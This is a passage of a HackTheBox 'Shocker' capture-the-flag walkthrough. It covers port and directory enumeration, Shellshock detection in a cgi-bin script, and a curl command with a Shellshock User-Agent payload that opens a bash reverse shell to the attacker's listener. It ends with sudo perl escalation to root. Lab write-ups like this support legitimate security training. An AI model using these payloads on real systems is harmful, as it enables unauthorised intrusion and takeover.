OS:NW6%O6=M505ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN( 
OS:R=Y%DF=Y%T=40%W=7210%O=M505NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS 
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R= 
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F= 
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T 
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD= 
OS:S) 
 
Uptime guess: 0.025 days (since Sat Apr  2 16:37:24 2022) 
Network Distance: 2 hops 
TCP Sequence Prediction: Difficulty=263 (Good luck!) 
IP ID Sequence Generation: All zeros 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 
 
TRACEROUTE (using port 8888/tcp) 
HOP RTT       ADDRESS 
1   161.20 ms 10.10.14.1 
2   159.37 ms 10.10.10.56
```

## In berif scan we got two port open one is 80 i,e http port and 2222 this is ssh port. Let's acess the http port first 

![http](https://raw.githubusercontent.com/SUNNYSAINI01001/HackTheBox/main/Shocker/http.png)

## Here we got Don't Bug Me! message with a image. Let's further enumerate the machine. Using dirb tool we get some directory

```
dirb http://10.10.10.56
```

### Result

```                                                          
---- Scanning URL: http://10.10.10.56/ ---- 
+ http://10.10.10.56/cgi-bin/ (CODE:403|SIZE:294)                                                                             
+ http://10.10.10.56/index.html (CODE:200|SIZE:137)                                                                           
+ http://10.10.10.56/server-status (CODE:403|SIZE:299)
```

## Here we got a directory cgi-bin we know there is a vulnerability name shell shock in cgi-bin if you want to read about shell shock use this https://book.hacktricks.xyz/pentesting/pentesting-web/cgi. let's again emurate files in the cgi-bin directory using .sh,.cgi

```
dirb http://10.10.10.56/cgi-bin /usr/share/wordlists/dirb/common.txt -X .sh,.cgi
```

### Result

```
---- Scanning URL: http://10.10.10.56/cgi-bin/ ---- 
+ http://10.10.10.56/cgi-bin/user.sh (CODE:200|SIZE:118)  
```

## Here we got user.sh file in the cgi-bin directory for confirming shell shock vuln let's use Shell Scan tool.

### Using ShellScan script (https://github.com/0xICF/ShellScan/archive/v1.0-Beta.zip) let's check it out there is really a shell shock vulnerability in our machine


```
python2 ShellScan.py config/host.txt config/cgi.txt
```

### Result

```
Scanning 1 hosts with 1 CGIs using 20 Threads 
Attacks chosen: [1, 2]. Exploit payload: () { _; } >_[$($())] { command; } 
None /cgi-bin/user.sh 
None /cgi-bin/user.sh 
10.10.10.56/cgi-bin/user.sh      VULNERABLE TO SLEEP TEST 
10.10.10.56/cgi-bin/user.sh - sleep test - VULNERABLE - 9.54562711716 
None /cgi-bin/user.sh 
None /cgi-bin/user.sh 
10.10.10.56/cgi-bin/user.sh      VULNERABLE TO PING TEST 
10.10.10.56/cgi-bin/user.sh - ping test - VULNERABLE - 8.52472805977
```

## Here we got user.sh is vulnerable to shell shock now let's gain acess using reverse shell and a netcat listner

```
curl -H "User-Agent: () { :;}; /bin/bash -i >& /dev/tcp/10.10.14.2/1234 0>&1" http://10.10.10.56/cgi-bin/user.sh
```

### BOOMM!! We Got Shell 

![shell](https://c.tenor.com/GypyMKaLYXgAAAAd/party-excited.gif)

## Using check privileges using below command

```
sudo -l
```

### Result

```
Matching Defaults entries for shelly on Shocker: 
    env_reset, mail_badpass, 
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin 
 
User shelly may run the following commands on Shocker: 
    (root) NOPASSWD: /usr/bin/perl
```

## Using https://gtfobins.github.io/gtfobins/ 

```
sudo perl -e 'exec "/bin/sh";'
```

# WE GOT ROOT SHELL.

![root](https://media0.giphy.com/media/AcfTF7tyikWyroP0x7/giphy.gif?cid=790b76113cec3d771961725980ace98594e18ef25961fc5a&rid=giphy.gif&ct=g)
